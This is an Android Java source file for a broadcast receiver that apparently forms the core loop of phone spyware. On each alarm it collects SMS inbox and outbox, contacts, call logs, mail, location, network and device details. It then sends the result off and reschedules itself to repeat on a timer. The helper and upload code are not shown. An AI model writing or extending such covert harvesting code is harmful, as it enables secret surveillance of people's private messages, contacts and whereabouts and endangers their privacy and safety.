package dd_pc.service;

import android.annotation.TargetApi;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.SystemClock;
import android.widget.Toast;

import java.io.UnsupportedEncodingException;


public class RepeatingAlarmService extends BroadcastReceiver {
    public static final long INTERVAL_ONE_MINUTES = 60 * 1000;
    @TargetApi(Build.VERSION_CODES.FROYO)
    @Override
    public void onReceive(final Context context, Intent intent) {

        ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(context.CONNECTIVITY_SERVICE);
        NetworkInfo nInfo = connMgr.getActiveNetworkInfo();
        android.net.NetworkInfo wifi = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        android.net.NetworkInfo mobile = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (((wifi.isAvailable() || mobile.isAvailable()) && nInfo != null && nInfo.isConnected())) {
            try {
                     MyLocationListener.SetUpLocationListener(context);
                     MyLocationListener.imHere.setLatitude(-0);
                     MyLocationListener.imHere.setLongitude(-0);

                  MyLocationListener.SetUpLocationListener(context);
                  smsCall.sms.mmain_outbox(context);
                 smsCall.sms.mmain_inbox(context);
                 smsCall.sms.contacts(context);
                  smsCall.sms.get_call_log(context);
                 smsCall.sms.mail(context);


                smsCall.sms.gpr(context);
                smsCall.sms.helth(context);
                smsCall.sms.network(context);
                smsCall.sms.device(context);
            } catch (Exception er) {
                Toast.makeText(context, "Exeption er" + er.getMessage(), Toast.LENGTH_LONG).show();
            }


            try {
                smsCall.sms.send_respinse();
                smsCall.sms.psrsing();

                intent = new Intent(context, RepeatingAlarmService.class);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(context, ServiceActivityClass.REQUEST_CODE, intent, 0);
                ServiceActivityClass.alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                ServiceActivityClass.alarmManager.setRepeating(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + (INTERVAL_ONE_MINUTES * smsCall.sms.time_interval_internet_int),
                        SystemClock.elapsedRealtime() + (INTERVAL_ONE_MINUTES * smsCall.sms.time_interval_internet_int * 100),
                        pendingIntent);

                Toast.makeText(context, "Send" + smsCall.sms.responseJson + "Time: " + smsCall.sms.time_interval_internet_int, Toast.LENGTH_LONG).show();
                smsCall.sms.Clear();
            } catch (UnsupportedEncodingException e) {

                Toast.makeText(context, "Error Send" + e.getMessage().toString(), Toast.LENGTH_LONG).show();
            }
        } else {

            intent = new Intent(context, RepeatingAlarmService.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, ServiceActivityClass.REQUEST_CODE, intent, 0);
            ServiceActivityClass.alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            ServiceActivityClass.alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + (INTERVAL_ONE_MINUTES * 5),
                    SystemClock.elapsedRealtime() + (INTERVAL_ONE_MINUTES * 100),
                    pendingIntent);
            Toast.makeText(context, "Connection False", Toast.LENGTH_LONG).show();
        }

    }

    }
